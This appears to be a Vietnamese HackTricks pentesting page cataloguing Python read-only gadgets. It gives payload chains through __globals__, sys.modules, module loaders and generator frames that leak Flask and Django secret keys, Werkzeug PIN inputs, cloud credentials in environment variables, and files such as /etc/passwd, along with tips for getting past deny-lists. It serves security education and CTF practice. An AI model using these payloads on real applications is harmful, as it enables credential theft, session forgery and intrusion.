# Các gadget đọc dữ liệu nội bộ của Python

{{#include ../../banners/hacktricks-training.md}}

## Thông tin cơ bản

Các lỗ hổng khác nhau như [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) hoặc [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) có thể cho phép bạn **đọc dữ liệu nội bộ của Python nhưng không cho phép thực thi code**. Vì vậy, pentester cần tận dụng tối đa quyền đọc này để **thu thập các đặc quyền nhạy cảm và nâng cấp lỗ hổng**.

### Flask - Đọc secret key

Trang chính của ứng dụng Flask có thể sẽ có đối tượng global **`app`** nơi **secret này được cấu hình**.

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

Trong trường hợp này, có thể truy cập object này chỉ bằng bất kỳ gadget nào để **access global objects** từ trang [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Nếu **vulnerability nằm trong một file Python khác**, bạn cần một gadget để duyệt qua các file và đến file chính nhằm **access global object `app.secret_key`**, từ đó có thể [**escalate privileges** khi biết key này](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Một payload như payload này [từ writeup này](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Dùng payload này để **đọc `app.secret_key`**. Nếu lỗi ban đầu cũng cho phép bạn ghi (ví dụ: class pollution), bạn có thể dùng cùng đường dẫn để thay thế nó và ký các Flask cookie có đặc quyền cao hơn.

### Werkzeug - machine_id và node uuid

[**Dùng các payload này từ bài viết**](https://vozec.fr/writeups/tweedle-dum-dee/) để truy cập **machine_id** và **uuid** của node, vốn là các **thông tin riêng tư** bạn cần để [**tạo Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) và truy cập Python console tại `/console` nếu **debug mode được bật**:<sup>[[4]](#references)</sup>

```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```

> [!WARNING]
> Lưu ý rằng bạn có thể lấy được **đường dẫn cục bộ của máy chủ tới `app.py`** bằng cách tạo ra một số **lỗi** trên trang web, khiến **đường dẫn bị tiết lộ**.

Nếu lỗ hổng nằm trong một file Python khác, hãy xem thủ thuật Flask trước đó để truy cập các đối tượng từ file Python chính.

### Django - SECRET_KEY và module settings

Đối tượng settings của Django được lưu trong bộ nhớ đệm của `sys.modules` khi ứng dụng khởi chạy. Chỉ với các primitive đọc, bạn có thể làm lộ **`SECRET_KEY`**, các khóa dự phòng, thông tin xác thực cơ sở dữ liệu hoặc signing salts:

```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
 a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```

Nếu gadget dễ bị khai thác nằm trong module khác, hãy duyệt qua globals trước:

```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```

`SECRET_KEY_FALLBACKS` có giá trị ngang với `SECRET_KEY` hiện tại: chúng vẫn xác thực các giá trị đã ký cũ trong quá trình xoay vòng.<sup>[[1]](#references)</sup> Đồng thời leak `SESSION_ENGINE` và `SESSION_SERIALIZER` để nhanh chóng xác định tác động chỉ giới hạn ở việc giả mạo cookie hay còn nghiêm trọng hơn. Để biết chi tiết về tác động trên web, hãy xem [**trang pentesting Django**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - đọc mã nguồn và tệp

Các module Python đã được tải thường giữ một `__loader__`. Các loader dựa trên tệp thường cung cấp `get_source()` và `get_data()`, là những **primitive chỉ đọc** rất hữu ích khi bạn đã truy cập được đối tượng module nhưng không thể dùng `open()`:

```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```

Cách này rất hữu ích để dump **các module config, blueprint, file trợ giúp hoặc route ẩn** và lấy lại API key, DSN, đường dẫn flag hoặc các điểm vào gadget bổ sung.

Nếu chỉ có thể liệt kê các subclass, hãy tìm loader theo tên thay vì hard-code chỉ mục:

```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```

### Generator / coroutine frame globals

Nếu có thể tạo hoặc truy cập một đối tượng generator/coroutine, frame của nó có thể làm lộ globals **mà không cần gadget `__globals__` của bất kỳ function nào**. Điều này hữu ích khi khai thác các bộ lọc chỉ chặn tên dunder nhưng bỏ sót các frame attribute như `gi_frame`, `ag_frame`, `cr_frame` hoặc `f_globals`:

```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```

Khi đã lấy được các global của frame, hãy tiếp tục chính xác như với các gadget khác (`sys.modules`, các object settings, `os.environ`, v.v.). Các sandbox escape gần đây liên tục phát hiện lại kỹ thuật này vì `gi_frame` và `f_globals` không phải là thuộc tính dunder và thường vẫn tồn tại sau các deny-list đơn giản.

### Biến môi trường / thông tin xác thực cloud qua các module đã tải

Nhiều jail vẫn import `os` hoặc `sys` ở đâu đó. Bạn có thể lạm dụng bất kỳ hàm nào có thể truy cập được qua `__init__.__globals__` để chuyển hướng đến module `os` đã được import và trích xuất **biến môi trường** chứa API token, cloud key hoặc flag:

```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```

Nếu chỉ mục subclass bị lọc, hãy sử dụng loaders:

```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```

Các biến môi trường thường là những bí mật duy nhất cần có để chuyển từ quyền đọc sang toàn quyền xâm nhập (khóa cloud IAM, URL database, khóa ký, v.v.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), các phiên bản bị ảnh hưởng `<0.61.0`) cho phép **class pollution** thông qua các request component được tạo có chủ đích. Đường dẫn thuộc tính như `__init__.__globals__` có thể truy cập các biến toàn cục của module component và các module đã import; advisory minh họa việc ghi đè `SECRET_KEY` của Django và các giá trị trong `os.environ`, thay vì một khai thác chỉ đọc.<sup>[[5]](#references)</sup> Nếu một lỗi riêng biệt cho phép đọc cùng đồ thị đối tượng đó, các biến toàn cục này có thể làm lộ cấu hình và thông tin xác thực mà không cần thực thi mã.

### Các bộ sưu tập gadget để kết hợp khai thác

Các CTF gần đây và nghiên cứu pyjail cho thấy có những chuỗi đọc đáng tin cậy chỉ cần truy cập thuộc tính và liệt kê subclass. Các danh sách do cộng đồng duy trì như [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) tập hợp hàng trăm gadget tối giản mà bạn có thể kết hợp để đi từ các đối tượng đến `__globals__`, `sys.modules` và cuối cùng là dữ liệu nhạy cảm.<sup>[[2]](#references)</sup> Nên tìm kiếm dựa trên **thuộc tính/tên** thay vì chỉ số subclass thô, vì vị trí của `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, v.v. thay đổi giữa các phiên bản Python và tùy theo các thư viện được import thêm.

## References

- [1] [Tài liệu về ký mã hóa của Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki gadget cho sandbox Python](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / bài viết lời giải](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – bài viết lời giải FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Lỗ hổng Class Pollution của Django-Unicorn, dẫn đến RCE, XSS, DoS và vượt qua xác thực (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
